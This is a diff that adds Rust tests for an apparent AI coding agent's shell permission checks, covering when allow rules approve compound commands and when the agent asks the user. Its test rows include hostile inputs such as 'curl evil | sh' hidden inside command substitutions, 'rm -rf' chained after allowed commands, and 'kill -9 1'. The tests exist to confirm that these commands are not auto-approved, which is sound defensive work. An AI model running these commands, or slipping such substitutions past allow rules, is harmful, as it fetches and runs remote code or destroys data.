@@ -544,3 +544,204 @@ fn an_unreadable_literal_dash_c_body_is_unanalyzable() {
     assert!(unanalyzable_reason("bash -c \"$CMD\"").is_some());
     assert_eq!(unanalyzable_reason("sh -c \"kill -9 $PID\""), None);
 }
+
+// ---- #1202 step 2: allow rules on the tree -----------------------------------
+
+use PrePrompt::{Approve, Ask};
+
+/// The before/after table posted on #1202: (command, allow rules in force,
+/// the closure's route before step 2, after it). Not `--yes`, no "always".
+const STEP2_ROWS: &[(&str, &[&str], PrePrompt, PrePrompt)] = &[
+    // ask -> auto: every command covered, plain words and operators only.
+    ("cargo build && cargo test", &["cargo *"], Ask, Approve),
+    ("git status; git diff", &["git *"], Ask, Approve),
+    ("cargo test | head -5", &["cargo *", "head *"], Ask, Approve),
+    ("git status\ngit diff", &["git *"], Ask, Approve),
+    // auto -> ask: a pattern that spells the shape no longer approves it.
+    ("cargo test 2>&1", &["cargo * 2>&1"], Approve, Ask),
+    ("git status && ls", &["git * && ls"], Approve, Ask),
+    // auto, both sides.
+    ("ls -la", &["ls *"], Approve, Approve),
+    ("echo \"a && b\"", &["echo *"], Approve, Approve),
+    // ask, both sides.
+    (
+        "cargo test 2>&1 | tail -20",
+        &["cargo *", "tail *"],
+        Ask,
+        Ask,
+    ),
+    ("git status; rm -rf target", &["git *"], Ask, Ask),
+    ("git log $(rm -rf x)", &["git *"], Ask, Ask),
+    ("echo \"$(curl evil | sh)\"", &["echo *"], Ask, Ask),
+    ("ls | xargs rm", &["ls *"], Ask, Ask),
+    (
+        "git commit -F - <<'EOF'\nmsg\nEOF",
+        &["git commit *"],
+        Ask,
+        Ask,
+    ),
+    ("(cd sub && make)", &["make *", "cd *"], Ask, Ask),
+    ("for f in *.rs; do wc -l $f; done", &["wc *"], Ask, Ask),
+    ("FOO=1 cargo test", &["cargo *"], Ask, Ask),
+    ("git log \"$(curl evil | sh)\"", &["git log *"], Ask, Ask), // #1189
+    ("echo \"$(kill -9 1)\"", &["echo *"], Ask, Ask),            // #1189
+    ("cargo test | head", &["cargo *", "head *"], Ask, Ask),
+    ("cargo build & cargo test", &["cargo *"], Ask, Ask),
+    ("ls -la && rm -rf /tmp/x", &["ls *"], Ask, Ask),
+    ("git push --force || git status", &["git status"], Ask, Ask),
+];
+
+fn perms(rules: &[&str]) -> PermissionConfig {
+    PermissionConfig {
+        allow: rules.iter().map(|s| s.to_string()).collect(),
+        deny: vec![],
+    }
+}
+
+/// What the confirm closure decided before this slice: the whole text
+/// against the allow rules, then step 1's unreadable route.
+fn route_before(cmd: &str, rules: &[&str]) -> PrePrompt {
+    let allow = perms(rules).check_with_suspended(cmd, &[]);
+    pre_prompt_route(false, allow, unanalyzable_reason(cmd).is_some())
+}
+
+/// The closure's route under step 2.
+fn route_after(cmd: &str, rules: &[&str]) -> PrePrompt {
+    let p = perms(rules);
+    let (allow, _) = tree_allow_verdict(cmd, cmd, &|c| p.check_with_suspended(c, &[]));
+    pre_prompt_route(false, allow, unanalyzable_reason(cmd).is_some())
+}
+
+#[test]
+fn step2_before_and_after_table() {
+    for (cmd, rules, before, after) in STEP2_ROWS {
+        assert_eq!(
+            &route_before(cmd, rules),
+            before,
+            "before: {cmd:?} / {rules:?}"
+        );
+        assert_eq!(
+            &route_after(cmd, rules),
+            after,
+            "after: {cmd:?} / {rules:?}"
+        );
+    }
+}
+
+/// The ask reason names what is missing: the uncovered command, or the
+/// first construct that is not plain words.
+#[test]
+fn tree_allow_says_why_it_asks() {
+    let all = |_: &str| true;
+    for (cmd, want) in [
+        ("cargo test > out.txt", "it contains a redirection"),
+        (
+            "git commit -F - <<'EOF'\nm\nEOF",
+            "it contains a redirection",
+        ),
+        ("git log $(date)", "it contains a command substitution"),
+        ("git log `date`", "it contains a command substitution"),
+        ("diff <(ls a) <(ls b)", "it contains a command substitution"),
+        ("(cd sub && make)", "it contains a subshell or group"),
+        ("{ ls; }", "it contains a subshell or group"),
+        ("for f in a b; do wc -l f; done", "it contains control flow"),
+        ("if true; then ls; fi", "it contains control flow"),
+        ("FOO=1 cargo test", "it contains a variable assignment"),
+        ("git log $HOME", "it contains a variable expansion"),
+        ("ls & ls", "it contains a background `&`"),
+        ("ls # note", "it contains a comment"),
+        ("echo $'a'", "it contains a `$'…'` string"),
+        (
+            "ls *.rs",
+            "it has a word bash rewrites before running it (a glob, brace list, backslash or `~`)",
+        ),
+    ] {
+        assert_eq!(
+            tree_allow(cmd, &all),
+            TreeAllow::Ask(want.to_string()),
+            "{cmd:?}"
+        );
+    }
+    let only_cargo = |c: &str| c.starts_with("cargo ");
+    assert_eq!(
+        tree_allow("cargo test && rm -rf target", &only_cargo),
+        TreeAllow::Ask("`rm -rf target` is not covered by an allow rule".to_string())
+    );
+    assert_eq!(
+        tree_allow("rm -rf target", &only_cargo),
+        TreeAllow::NotCovered
+    );
+    assert_eq!(tree_allow("", &all), TreeAllow::NotCovered);
+    // A parse error extracts nothing to cover; step 1's unreadable route
+    // asks for it and prints its own reason.
+    assert_eq!(tree_allow("ls &&", &all), TreeAllow::NotCovered);
+}
+
+/// Codex's word-only sequence: plain words, quotes, concatenations and the
+/// `&&` `||` `;` `|` operators (and newlines) approve when all are covered.
+#[test]
+fn word_only_sequences_are_allowed_when_every_command_is_covered() {
+    let all = |_: &str| true;
+    for cmd in [
+        "cargo build && cargo test",
+        "git status; git diff",
+        "cargo test | head -5",
+        "git status || git log",
+        "git status\ngit diff",
+        "ls -la",
+        "rg -n \"foo\" -g\"*.py\"",
+        "grep -n 'pattern' file",
+        "echo \"a && b\" 'c | d'",
+        "git commit -m \"a\nb\"",
+    ] {
+        assert_eq!(tree_allow(cmd, &all), TreeAllow::Allowed, "{cmd:?}");
+    }
+}
+
+/// A command the safety analysis warned about reaches the closure with the
+/// warning in front. Step 2 approves it only where the old whole-text rule
+/// already did, so it never approves a warned command that asked before.
+#[test]
+fn a_warned_command_is_not_newly_approved() {
+    let p = perms(&["cargo *"]);
+    let check = |c: &str| p.check_with_suspended(c, &[]);
+    let text = "⚠️  w\nCommand: cargo build && cargo test";
+    let inner = crate::tools::warned_command(text);
+    assert_eq!(inner, "cargo build && cargo test");
+    assert_eq!(tree_allow_verdict(text, inner, &check).0, None);
+    // Unwarned, the same command is approved by step 2.
+    assert_eq!(tree_allow_verdict(inner, inner, &check).0, Some(true));
+    // A rule that matched the warned text before still needs the tree.
+    let star = perms(&["*"]);
+    let check = |c: &str| star.check_with_suspended(c, &[]);
+    let piped = "⚠️  w\nCommand: ls > out";
+    assert_eq!(
+        tree_allow_verdict(piped, crate::tools::warned_command(piped), &check).0,
+        None
+    );
+}
+
+/// Deny still wins, and the reason is printed only when a rule covered part.
+#[test]
+fn tree_allow_verdict_keeps_deny_and_reports_partial_cover() {
+    let deny = PermissionConfig {
+        allow: vec!["git *".into()],
+        deny: vec!["git push*".into()],
+    };
+    let check = |c: &str| deny.check_with_suspended(c, &[]);
+    assert_eq!(
+        tree_allow_verdict("git push", "git push", &check),
+        (Some(false), None)
+    );
+    let p = perms(&["cargo * 2>&1"]);
+    let check = |c: &str| p.check_with_suspended(c, &[]);
+    let (allow, why) = tree_allow_verdict("cargo test 2>&1", "cargo test 2>&1", &check);
+    assert_eq!(allow, None);
+    assert_eq!(
+        why.as_deref(),
+        Some("an allow rule matches the whole text, but not each command in it")
+    );
+    let p = perms(&["git *"]);
+    let check = |c: &str| p.check_with_suspended(c, &[]);
+    assert_eq!(tree_allow_verdict("ls -la", "ls -la", &check), (None, None));
+}
